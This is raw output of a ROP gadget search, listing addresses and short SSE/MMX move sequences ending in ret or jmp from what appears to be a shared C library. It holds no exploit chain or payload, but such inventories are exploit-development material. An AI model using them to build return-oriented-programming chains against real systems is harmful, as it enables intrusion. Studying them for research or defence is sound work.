0x00002aaaaac69499 : movabs eax, dword ptr [0xa390fffda290fffd] ; std ; call qword ptr [rax]
0x00002aaaaab20b47 : movabs eax, dword ptr [0xfffb5885c7fffffd] ; call qword ptr [rax]
0x00002aaaaaad7d11 : movabs r11, -0xc0717dedb2c1700 ; ret
0x00002aaaaab09b30 : movapd xmm0, xmm1 ; add rsp, 0x28 ; ret
0x00002aaaaab09acc : movapd xmm0, xmm1 ; jne 0x34aea ; add rsp, 0x28 ; ret
0x00002aaaaab0992f : movapd xmm0, xmm1 ; ret
0x00002aaaaab09b31 : movaps xmm0, xmm1 ; add rsp, 0x28 ; ret
0x00002aaaaab09acd : movaps xmm0, xmm1 ; jne 0x34ae9 ; add rsp, 0x28 ; ret
0x00002aaaaab09e08 : movaps xmm0, xmm1 ; jne 0x34e21 ; add rsp, 0x28 ; ret
0x00002aaaaab09930 : movaps xmm0, xmm1 ; ret
0x00002aaaaac259f6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x150a0e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25b46 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x150b5e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25c96 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x150cae ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25de6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x150dfe ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25f36 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x150f4e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26086 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15109e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac261d6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x1511ee ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26326 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15133e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26476 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15148e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac265c6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x1515de ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26716 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15172e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26866 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15187e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac269b6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x1519ce ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26b06 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x151b1e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26c56 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x151c6e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac283c6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x1533de ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28516 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15352e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28666 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15367e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac287b6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x1537ce ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28906 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15391e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28a56 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x153a6e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28ba6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x153bbe ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28cf6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x153d0e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28e46 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x153e5e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28f96 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x153fae ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac290e6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x1540fe ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac29236 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15424e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac29386 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15439e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac294d6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x1544ee ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac29626 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15463e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2ad96 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x155dae ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2aee6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x155efe ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b036 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15604e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b186 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15619e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b2d6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x1562ee ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b426 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15643e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b576 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15658e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b6c6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x1566de ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b816 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15682e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b966 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15697e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bab6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x156ace ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bc06 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x156c1e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bd56 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x156d6e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bea6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x156ebe ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bff6 : movaps xmmword ptr [rdi + 0x10], xmm3 ; jb 0x15700e ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25952 : movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2594e : movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac259fc : movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaab09dd3 : movd mm0, eax ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab09856 : movd mm0, eax ; ret
0x00002aaaaab09855 : movd mm0, rax ; ret
0x00002aaaaab0992c : movd mm1, eax ; movapd xmm0, xmm1 ; ret
0x00002aaaaab09cba : movd mm1, eax ; movaps xmm0, xmm1 ; ret
0x00002aaaaab098bf : movd mm1, eax ; movsd qword ptr [rdi], xmm1 ; ret
0x00002aaaaab09888 : movd mm1, eax ; movsd qword ptr [rdi], xmm1 ; subsd xmm0, xmm1 ; ret
0x00002aaaaab09c36 : movd mm1, eax ; movss dword ptr [rdi], xmm1 ; ret
0x00002aaaaab09c1d : movd mm1, eax ; movss dword ptr [rdi], xmm1 ; subss xmm0, xmm1 ; ret
0x00002aaaaab0992b : movd mm1, rax ; movapd xmm0, xmm1 ; ret
0x00002aaaaab098be : movd mm1, rax ; movsd qword ptr [rdi], xmm1 ; ret
0x00002aaaaab09dd2 : movd xmm0, eax ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab09c0c : movd xmm0, eax ; ret
0x00002aaaaab09cb9 : movd xmm1, eax ; movaps xmm0, xmm1 ; ret
0x00002aaaaab09c35 : movd xmm1, eax ; movss dword ptr [rdi], xmm1 ; ret
0x00002aaaaabb5130 : movdqa xmm0, xmm2 ; jmp 0xe0116
0x00002aaaaab7a280 : movdqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; mov byte ptr [rdi + 0x10], dh ; ret
0x00002aaaaab7a270 : movdqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x00002aaaaab636d0 : movdqu xmmword ptr [rdi + 0x10], xmm0 ; movdqu xmmword ptr [rdi + rdx - 0x20], xmm0 ; ret
0x00002aaaaab7bacd : movdqu xmmword ptr [rdi + 0x10], xmm2 ; lea rax, qword ptr [rdi + 0x1f] ; ret
0x00002aaaaab7c91d : movdqu xmmword ptr [rdi + 0x10], xmm2 ; lea rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab7b130 : movdqu xmmword ptr [rdi + 0x10], xmm2 ; mov byte ptr [rdi + 0x20], cl ; ret
0x00002aaaaab7a43d : movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x00002aaaaab7e38d : movdqu xmmword ptr [rdi + 0x10], xmm2 ; xor ch, ch ; mov byte ptr [rdi + 0x20], ch ; ret
0x00002aaaaab7cb83 : movdqu xmmword ptr [rdi + 0x30], xmm7 ; lea rax, qword ptr [rdi + 0x40] ; ret
0x00002aaaaab7b373 : movdqu xmmword ptr [rdi + 0x30], xmm7 ; ret
0x00002aaaaab7e403 : movdqu xmmword ptr [rdi + 0x30], xmm7 ; xor ch, ch ; mov byte ptr [rdi + 0x40], ch ; ret
0x00002aaaaac2f97f : movdqu xmmword ptr [rdi + 0xa], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2f90f : movdqu xmmword ptr [rdi + 0xb], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2f89f : movdqu xmmword ptr [rdi + 0xc], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2f82f : movdqu xmmword ptr [rdi + 0xd], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaab7ba6d : movdqu xmmword ptr [rdi + 0xd], xmm2 ; lea rax, qword ptr [rdi + 0x1c] ; ret
0x00002aaaaab7c8bd : movdqu xmmword ptr [rdi + 0xd], xmm2 ; lea rax, qword ptr [rdi + 0x1d] ; ret
0x00002aaaaab7a3dd : movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x00002aaaaab7e32d : movdqu xmmword ptr [rdi + 0xd], xmm2 ; xor ch, ch ; mov byte ptr [rdi + 0x1d], ch ; ret
0x00002aaaaac2f7bf : movdqu xmmword ptr [rdi + 0xe], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaab7ba8d : movdqu xmmword ptr [rdi + 0xe], xmm2 ; lea rax, qword ptr [rdi + 0x1d] ; ret
0x00002aaaaab7c8dd : movdqu xmmword ptr [rdi + 0xe], xmm2 ; lea rax, qword ptr [rdi + 0x1e] ; ret
0x00002aaaaab7a3fd : movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x00002aaaaab7e34d : movdqu xmmword ptr [rdi + 0xe], xmm2 ; xor ch, ch ; mov byte ptr [rdi + 0x1e], ch ; ret
0x00002aaaaac2f74f : movdqu xmmword ptr [rdi + 0xf], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaab7baad : movdqu xmmword ptr [rdi + 0xf], xmm2 ; lea rax, qword ptr [rdi + 0x1e] ; ret
0x00002aaaaab7c8fd : movdqu xmmword ptr [rdi + 0xf], xmm2 ; lea rax, qword ptr [rdi + 0x1f] ; ret
0x00002aaaaab7a41d : movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7e36d : movdqu xmmword ptr [rdi + 0xf], xmm2 ; xor ch, ch ; mov byte ptr [rdi + 0x1f], ch ; ret
0x00002aaaaac2fd6f : movdqu xmmword ptr [rdi + 1], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fcff : movdqu xmmword ptr [rdi + 2], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fc8f : movdqu xmmword ptr [rdi + 3], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fc1f : movdqu xmmword ptr [rdi + 4], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fbaf : movdqu xmmword ptr [rdi + 5], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fb3f : movdqu xmmword ptr [rdi + 6], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2facf : movdqu xmmword ptr [rdi + 7], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fa5f : movdqu xmmword ptr [rdi + 8], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2f9ef : movdqu xmmword ptr [rdi + 9], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaab636bc : movdqu xmmword ptr [rdi + rdx - 0x10], xmm0 ; ja 0x8e6d9 ; ret
0x00002aaaaab636d5 : movdqu xmmword ptr [rdi + rdx - 0x20], xmm0 ; ret
0x00002aaaaac2eedb : movdqu xmmword ptr [rdi - 0x10], xmm0 ; ret
0x00002aaaaac2ef4b : movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f686 : movdqu xmmword ptr [rdi - 0x11], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f606 : movdqu xmmword ptr [rdi - 0x12], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f576 : movdqu xmmword ptr [rdi - 0x13], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f4f6 : movdqu xmmword ptr [rdi - 0x14], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f476 : movdqu xmmword ptr [rdi - 0x15], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f3f6 : movdqu xmmword ptr [rdi - 0x16], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f376 : movdqu xmmword ptr [rdi - 0x17], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f2f6 : movdqu xmmword ptr [rdi - 0x18], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f276 : movdqu xmmword ptr [rdi - 0x19], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f1f6 : movdqu xmmword ptr [rdi - 0x1a], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f176 : movdqu xmmword ptr [rdi - 0x1b], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f0f6 : movdqu xmmword ptr [rdi - 0x1c], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f066 : movdqu xmmword ptr [rdi - 0x1d], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2efd6 : movdqu xmmword ptr [rdi - 0x1e], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2ef46 : movdqu xmmword ptr [rdi - 0x1f], xmm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaab7b230 : movdqu xmmword ptr [rdi - 1], xmm0 ; ret
0x00002aaaaab7c724 : movdqu xmmword ptr [rdi], xmm0 ; lea rax, qword ptr [rdi + 0x10] ; ret
0x00002aaaaab7b8e4 : movdqu xmmword ptr [rdi], xmm0 ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaab7c737 : movdqu xmmword ptr [rdi], xmm0 ; mov byte ptr [rdi + 0x10], cl ; lea rax, qword ptr [rdi + 0x11] ; ret
0x00002aaaaab7af57 : movdqu xmmword ptr [rdi], xmm0 ; mov byte ptr [rdi + 0x10], cl ; ret
0x00002aaaaab7b8f4 : movdqu xmmword ptr [rdi], xmm0 ; mov byte ptr [rdi + 0x10], dh ; lea rax, qword ptr [rdi + 0x10] ; ret
0x00002aaaaab7a284 : movdqu xmmword ptr [rdi], xmm0 ; mov byte ptr [rdi + 0x10], dh ; ret
0x00002aaaaab7b947 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x13] ; ret
0x00002aaaaab7c797 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x14] ; ret
0x00002aaaaab7a2d7 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x00002aaaaab7afaa : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dl ; ret
0x00002aaaaab7a2c7 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x00002aaaaab7b927 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x12] ; ret
0x00002aaaaab7c777 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x13] ; ret
0x00002aaaaab7a2b7 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7a358 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x00002aaaaab7a338 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x00002aaaaab7b02b : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0x10], rdx ; mov byte ptr [rdi + 0x18], cl ; ret
0x00002aaaaab7a39b : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x00002aaaaab7a3bb : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x00002aaaaab7a2f8 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x00002aaaaab7a318 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7a298 : movdqu xmmword ptr [rdi], xmm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x00002aaaaab7a439 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x00002aaaaab7a3d9 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x00002aaaaab7a3f9 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x00002aaaaab7a419 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7a274 : movdqu xmmword ptr [rdi], xmm0 ; ret
0x00002aaaaab7e194 : movdqu xmmword ptr [rdi], xmm0 ; xor ch, ch ; mov byte ptr [rdi + 0x10], ch ; ret
0x00002aaaaac2f754 : movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaab77032 : movlpd qword ptr [rdx + 5], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab77052 : movlpd qword ptr [rdx + 6], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab77072 : movlpd qword ptr [rdx + 7], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab76ebc : movlpd qword ptr [rdx + 8], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab76e66 : movlpd qword ptr [rdx], xmm0 ; mov rax, rdi ; ret
0x00002aaaaab76e62 : movlpd xmm0, qword ptr [rcx] ; movlpd qword ptr [rdx], xmm0 ; mov rax, rdi ; ret
0x00002aaaaab77033 : movlps qword ptr [rdx + 5], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab77053 : movlps qword ptr [rdx + 6], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab77073 : movlps qword ptr [rdx + 7], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab76ebd : movlps qword ptr [rdx + 8], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab76e67 : movlps qword ptr [rdx], xmm0 ; mov rax, rdi ; ret
0x00002aaaaab76eb9 : movlps qword ptr [rdx], xmm0 ; movlpd qword ptr [rdx + 8], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab79c3b : movlps qword ptr [rdx], xmm0 ; xor ah, ah ; mov byte ptr [rdx + 8], ah ; mov rax, rdi ; ret
0x00002aaaaab76e63 : movlps xmm0, qword ptr [rcx] ; movlpd qword ptr [rdx], xmm0 ; mov rax, rdi ; ret
0x00002aaaaabd626b : movmskpd eax, xmm0 ; and eax, 1 ; jmp 0x10123f
0x00002aaaaabd626c : movmskps eax, xmm0 ; and eax, 1 ; jmp 0x10123e
0x00002aaaaab74766 : movnti dword ptr [rbx + rcx*4 + 5], ecx ; imul edi, dword ptr [rdx], 0x394c0032 ; ret 0x830f
0x00002aaaaabb5131 : movq mm0, mm2 ; jmp 0xe0115
0x00002aaaaab7c721 : movq mm0, qword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; lea rax, qword ptr [rdi + 0x10] ; ret
0x00002aaaaab7b8e1 : movq mm0, qword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaab7a281 : movq mm0, qword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; mov byte ptr [rdi + 0x10], dh ; ret
0x00002aaaaab7a271 : movq mm0, qword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x00002aaaaab636d1 : movq qword ptr [rdi + 0x10], mm0 ; movdqu xmmword ptr [rdi + rdx - 0x20], xmm0 ; ret
0x00002aaaaab7bace : movq qword ptr [rdi + 0x10], mm2 ; lea rax, qword ptr [rdi + 0x1f] ; ret
0x00002aaaaab7c91e : movq qword ptr [rdi + 0x10], mm2 ; lea rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab7b131 : movq qword ptr [rdi + 0x10], mm2 ; mov byte ptr [rdi + 0x20], cl ; ret
0x00002aaaaab7a43e : movq qword ptr [rdi + 0x10], mm2 ; ret
0x00002aaaaab7e38e : movq qword ptr [rdi + 0x10], mm2 ; xor ch, ch ; mov byte ptr [rdi + 0x20], ch ; ret
0x00002aaaaab7cb84 : movq qword ptr [rdi + 0x30], mm7 ; lea rax, qword ptr [rdi + 0x40] ; ret
0x00002aaaaab7b374 : movq qword ptr [rdi + 0x30], mm7 ; ret
0x00002aaaaab7e404 : movq qword ptr [rdi + 0x30], mm7 ; xor ch, ch ; mov byte ptr [rdi + 0x40], ch ; ret
0x00002aaaaac2f980 : movq qword ptr [rdi + 0xa], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2f910 : movq qword ptr [rdi + 0xb], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2f8a0 : movq qword ptr [rdi + 0xc], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2f830 : movq qword ptr [rdi + 0xd], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaab7ba6e : movq qword ptr [rdi + 0xd], mm2 ; lea rax, qword ptr [rdi + 0x1c] ; ret
0x00002aaaaab7c8be : movq qword ptr [rdi + 0xd], mm2 ; lea rax, qword ptr [rdi + 0x1d] ; ret
0x00002aaaaab7a3de : movq qword ptr [rdi + 0xd], mm2 ; ret
0x00002aaaaab7e32e : movq qword ptr [rdi + 0xd], mm2 ; xor ch, ch ; mov byte ptr [rdi + 0x1d], ch ; ret
0x00002aaaaac2f7c0 : movq qword ptr [rdi + 0xe], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaab7ba8e : movq qword ptr [rdi + 0xe], mm2 ; lea rax, qword ptr [rdi + 0x1d] ; ret
0x00002aaaaab7c8de : movq qword ptr [rdi + 0xe], mm2 ; lea rax, qword ptr [rdi + 0x1e] ; ret
0x00002aaaaab7a3fe : movq qword ptr [rdi + 0xe], mm2 ; ret
0x00002aaaaab7e34e : movq qword ptr [rdi + 0xe], mm2 ; xor ch, ch ; mov byte ptr [rdi + 0x1e], ch ; ret
0x00002aaaaac2f750 : movq qword ptr [rdi + 0xf], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaab7baae : movq qword ptr [rdi + 0xf], mm2 ; lea rax, qword ptr [rdi + 0x1e] ; ret
0x00002aaaaab7c8fe : movq qword ptr [rdi + 0xf], mm2 ; lea rax, qword ptr [rdi + 0x1f] ; ret
0x00002aaaaab7a41e : movq qword ptr [rdi + 0xf], mm2 ; ret
0x00002aaaaab7e36e : movq qword ptr [rdi + 0xf], mm2 ; xor ch, ch ; mov byte ptr [rdi + 0x1f], ch ; ret
0x00002aaaaac2fd70 : movq qword ptr [rdi + 1], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fd00 : movq qword ptr [rdi + 2], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fc90 : movq qword ptr [rdi + 3], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fc20 : movq qword ptr [rdi + 4], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fbb0 : movq qword ptr [rdi + 5], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fb40 : movq qword ptr [rdi + 6], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fad0 : movq qword ptr [rdi + 7], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2fa60 : movq qword ptr [rdi + 8], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaac2f9f0 : movq qword ptr [rdi + 9], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00002aaaaab636bd : movq qword ptr [rdi + rdx - 0x10], mm0 ; ja 0x8e6d8 ; ret
0x00002aaaaab73ca7 : movq qword ptr [rdi + rdx - 0x10], mm0 ; ja 0x9ecca ; mov rax, rdi ; ret
0x00002aaaaab73ca6 : movq qword ptr [rdi + rdx - 0x10], mm0 ; ja 0x9eccb ; mov rax, rdi ; ret
0x00002aaaaab636d6 : movq qword ptr [rdi + rdx - 0x20], mm0 ; ret
0x00002aaaaac2eedc : movq qword ptr [rdi - 0x10], mm0 ; ret
0x00002aaaaac2ef4c : movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2f687 : movq qword ptr [rdi - 0x11], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f607 : movq qword ptr [rdi - 0x12], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f577 : movq qword ptr [rdi - 0x13], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f4f7 : movq qword ptr [rdi - 0x14], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f477 : movq qword ptr [rdi - 0x15], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
